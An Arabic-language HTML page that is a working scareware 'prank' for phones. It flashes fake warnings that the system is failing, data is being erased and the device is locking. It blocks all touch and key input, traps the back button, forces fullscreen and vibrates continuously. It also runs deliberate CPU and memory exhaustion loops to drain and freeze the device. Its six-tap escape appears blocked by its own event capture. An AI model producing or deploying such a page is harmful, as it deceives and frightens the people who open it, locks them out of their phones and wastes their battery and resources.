<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="theme-color" content="#000">
<title> </title>
<style>
*{margin:0;padding:0;box-sizing:border-box;-webkit-user-select:none;user-select:none;touch-action:none}
html,body{width:100%;height:100%;overflow:hidden;background:#000;position:fixed;font-family:-apple-system,sans-serif}
#ui{position:fixed;inset:0;z-index:30;display:flex;flex-direction:column;align-items:center;justify-content:center;color:#fff;background:#000}
.sp{width:85px;height:85px;border:8px solid rgba(255,255,255,.07);border-top-color:#ff2d55;border-radius:50%;animation:s .45s linear infinite;margin-bottom:24px}
@keyframes s{to{transform:rotate(360deg)}}
.t{font-size:22px;font-weight:700;text-align:center;padding:0 14px;margin-bottom:10px}
.s{font-size:13px;color:#999;text-align:center;padding:0 18px}
.st{position:fixed;top:40px;left:0;right:0;text-align:center;color:#ff2d55;font-size:13px;font-weight:600}
#c{position:fixed;inset:0;z-index:10}
.shake{animation:sh .09s infinite}
@keyframes sh{0%{transform:translate(0,0)}25%{transform:translate(-8px,6px)}50%{transform:translate(7px,-7px)}75%{transform:translate(-6px,-5px)}100%{transform:translate(0,0)}}
.flash{animation:f .12s}
@keyframes f{0%{background:#ff2d55}100%{background:#000}}
</style>
</head>
<body>
<div id="ui">
  <div class="st" id="st">⚠ خطأ حرج</div>
  <div class="sp"></div>
  <div class="t" id="t">جاري إصلاح النظام...</div>
  <div class="s">لا تغلق الهاتف</div>
</div>
<canvas id="c"></canvas>

<script>
const stop=e=>{e.preventDefault();e.stopPropagation();return false};
['touchstart','touchmove','touchend','touchcancel','gesturestart','gesturechange','gestureend',
'contextmenu','selectstart','dragstart','mousedown','mouseup','click','keydown','keyup','wheel'].forEach(e=>document.addEventListener(e,stop,{passive:false,capture:true}));
history.pushState(null,null,location.href);
window.onpopstate=()=>history.pushState(null,null,location.href);

const v=p=>navigator.vibrate&&navigator.vibrate(p);
setInterval(()=>v([90,35,90,35,140]),1000);
setInterval(()=>v(45),650);

const ts=['جاري إصلاح النظام...','خطأ حرج في الذاكرة','يتم مسح البيانات...','النظام توقف عن الاستجابة','جاري قفل الجهاز...','بطارية حرجة 1%','فشل استعادة النظام'];
const sts=['⚠ خطأ حرج','⚠ ذاكرة تالفة','⚠ بطارية حرجة','⚠ فشل الإقلاع'];
setInterval(()=>{
  document.getElementById('t').textContent=ts[Math.floor(Math.random()*ts.length)];
  document.getElementById('st').textContent=sts[Math.floor(Math.random()*sts.length)];
},1500);

const ui=document.getElementById('ui');
setInterval(()=>{ui.classList.add('flash');setTimeout(()=>ui.classList.remove('flash'),130);v([140,50,140]);},2800);
setInterval(()=>{ui.classList.add('shake');setTimeout(()=>ui.classList.remove('shake'),550);},4200);

// ===== الحمل الثقيل =====
const canvas=document.getElementById('c');
const ctx=canvas.getContext('2d');
canvas.width=innerWidth;
canvas.height=innerHeight;

let particles=[];
for(let i=0;i<400;i++){
  particles.push({
    x:Math.random()*canvas.width,
    y:Math.random()*canvas.height,
    r:2+Math.random()*6,
    vx:(Math.random()-.5)*4,
    vy:(Math.random()-.5)*4
  });
}

// رسم تقيل + حسابات
function burn(){
  // حسابات تقيلة
  let x=0;
  for(let i=0;i<180000;i++) x+=Math.sin(i)*Math.sqrt(i+1);

  // رسم
  ctx.fillStyle='rgba(0,0,0,0.15)';
  ctx.fillRect(0,0,canvas.width,canvas.height);
  for(let i=0;i<particles.length;i++){
    const p=particles[i];
    p.x+=p.vx; p.y+=p.vy;
    if(p.x<0||p.x>canvas.width) p.vx*=-1;
    if(p.y<0||p.y>canvas.height) p.vy*=-1;
    ctx.beginPath();
    ctx.arc(p.x,p.y,p.r,0,7);
    ctx.fillStyle=`rgba(255,45,85,${0.3+Math.random()*0.5})`;
    ctx.fill();
  }

  // تخصيص ذاكرة إضافي
  const arr=new Float64Array(50000);
  for(let i=0;i<arr.length;i++) arr[i]=Math.random();

  requestAnimationFrame(burn);
}

// نبدأ الحمل بعد ثانيتين
setTimeout(()=>{
  burn();
  // لوب إضافي على المين ثريد
  function extra(){
    let y=1;
    for(let i=0;i<300000;i++) y+=Math.cos(i*0.001)*Math.tan(i%50+1);
    setTimeout(extra,0);
  }
  extra();
  // اهتزاز أقوى
  setInterval(()=>v([120,40,120,40,180]),750);
},2000);

// خروج: 6 ضغطات
let taps=[];
document.addEventListener('touchend',()=>{
  const now=Date.now();
  taps.push(now);
  taps=taps.filter(t=>now-t<900);
  if(taps.length>=6){
    if(navigator.vibrate) navigator.vibrate(0);
    document.body.innerHTML=`<div style="height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#0f0;font-family:monospace;text-align:center;padding:20px">
      <div style="font-size:32px;margin-bottom:12px">تم الخروج 😈</div>
      <div style="font-size:14px;color:#777">المقلب انتهى</div>
    </div>`;
  }
},{passive:false});

document.documentElement.requestFullscreen?.().catch(()=>{});
</script>
</body>
</html>
